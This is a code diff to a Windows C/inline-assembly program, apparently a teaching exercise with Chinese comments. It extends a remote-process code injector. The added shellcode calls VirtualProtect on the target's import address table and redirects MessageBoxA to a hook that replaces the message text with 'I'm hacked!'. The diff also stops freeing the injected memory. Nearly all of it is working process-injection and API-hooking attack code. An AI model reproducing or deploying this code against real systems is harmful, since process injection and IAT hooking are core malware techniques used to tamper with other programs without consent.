@@ -10,6 +10,9 @@ DWORD dwSizeOfCode;
 //下面是即将被注入的代码
 void code_start();              // code_start是二进制码的开始标记
 void _str_msgboxa();            // _str_msgboxa标记存放字符串的地址
+void _addr_MyMessageBoxA();
+void _addr_VirtualProtect();
+void _addr_MessageBoxA();
 void _addr_GetModuleHandleA();  //_addr_GetModuleHandleA 标记存放API入口地址的地址
 void GetIAFromImportTable(DWORD dwBase, LPCSTR lpszFuncName); // 寻找IA的函数
 //这里请填入需要一并被注入的函数代码
@@ -47,6 +50,30 @@ _cont1:
         call offset GetIAFromImportTable
         add  esp, 0x8
         cmp  eax, 0x0
+        mov ecx,[eax]                       //messbox的实际地址
+        mov [ebx + _addr_MessageBoxA],ecx  //把真正的messagebox的地址保存起来
+        push eax                            //把messagebox的入口地址保存起来
+     /************VirtualProtect**************/
+            push        55//开辟一个局部变量
+            push        esp//把局部变量的地址压入栈
+            push        0x40//请求的保护模式
+            push        4   //要修改的字节数
+            push        eax //要修改的首地址
+            lea edx,[ebx + _addr_VirtualProtect]//edx可以随便用吧
+            call   dword ptr [edx]
+            pop         eax//回收局部变量空间            
+     /************VirtualProtect**************/
+               //获得可写权限后，可以把自己函数的地址写入IAT
+        pop eax//恢复eax的值，里面是messagebox的入口地址
+        lea ecx,[ebx + _addr_MyMessageBoxA]//ecx保存自己的函数地址 
+        mov [eax],ecx//change IAT
+        /*test MyMessageBox*/
+        // lea ecx,[ebx + _str_msgboxa]
+        // push 0
+        // push ecx
+        // push ecx
+        // push 0
+        // call offset _addr_MyMessageBoxA
         jne  _ret
         mov  eax, 0x2
 _ret:
@@ -75,6 +102,52 @@ __declspec(naked) void _str_msgboxa()
         _emit 0x0
     }
 }
+__declspec(naked) void _addr_MyMessageBoxA()
+{
+    __asm {
+     
+        call _delta2
+_delta2:
+        pop eax
+        sub eax, offset _delta2
+        //找到基地址
+         lea  ecx, [eax + _str_hacked]
+         mov [esp+8],ecx
+         jmp  dword ptr [eax + _addr_MessageBoxA]   //need relocation
+_str_hacked:
+        _emit 'I'
+        _emit '\''
+        _emit 'm'
+        _emit ' '
+        _emit 'h'
+        _emit 'a'
+        _emit 'c'
+        _emit 'k'
+        _emit 'e'
+        _emit 'd'
+        _emit '!'
+        _emit 0x0
+   }
+}
+__declspec(naked) void _addr_MessageBoxA()
+{
+    __asm{
+         _emit 0xAA
+         _emit 0xBB
+         _emit 0xAA
+         _emit 0xDD
+        }
+}
+__declspec(naked) void _addr_VirtualProtect()
+{
+    __asm{
+         _emit 0xAA
+         _emit 0xBB
+         _emit 0xAA
+         _emit 0xDD
+        }
+}
+
 // _addr_GetModuleHandleA是存放GetModuleHandleA()的全局变量
 __declspec(naked) void _addr_GetModuleHandleA()
 {
@@ -246,7 +319,7 @@ __declspec(naked) void code_end()
 DWORD make_code()
 {
     int off; 
-    DWORD func_addr;
+    DWORD func_addr,protect;
     HMODULE hModule;
     __asm {
         mov edx, offset code_start
@@ -272,12 +345,16 @@ DWORD make_code()
         return 0;
     }
     func_addr = (DWORD)GetProcAddress(hModule, "GetModuleHandleA");
+    protect = (DWORD)GetProcAddress(hModule, "VirtualProtect");
+    //获取VirtualProtect的地址
     if (func_addr == 0) {
         printf("[E]: GetModuleHandleA not found. \n");
         return 0;
     }
     off = (DWORD)pCode - (DWORD)pOrignCode;
     *(PDWORD)((PBYTE)_addr_GetModuleHandleA + off) = func_addr;
+    *(PDWORD)((PBYTE)_addr_VirtualProtect + off) = protect;
+    //把VirtualProtect的地址写入pcode的相应位置
     return dwSizeOfCode;
 }
 // inject_code()函数是存放在pCode所指向的缓冲区中的二进制代码注入到远程进程中
@@ -301,7 +378,7 @@ int inject_code(DWORD pid)
         WaitForSingleObject(hThread, INFINITE);
         GetExitCodeThread(hThread, (PDWORD) &exitcode);
         printf(">exitcode is 0x%08x\n",exitcode);
-        VirtualFreeEx(hproc, pRemoteThread, 0, MEM_RELEASE);
+       // VirtualFreeEx(hproc, pRemoteThread, 0, MEM_RELEASE);
         if (!CloseHandle(hproc)) 
         {
         printf("[E]: Process (%d) cannot be closed !\n", pid);
@@ -328,5 +405,6 @@ int main(int argc, char *argv[])
     
     make_code();
     inject_code(pid);
+    printf("[inject_code]:done!\n");
     return 0;
 }
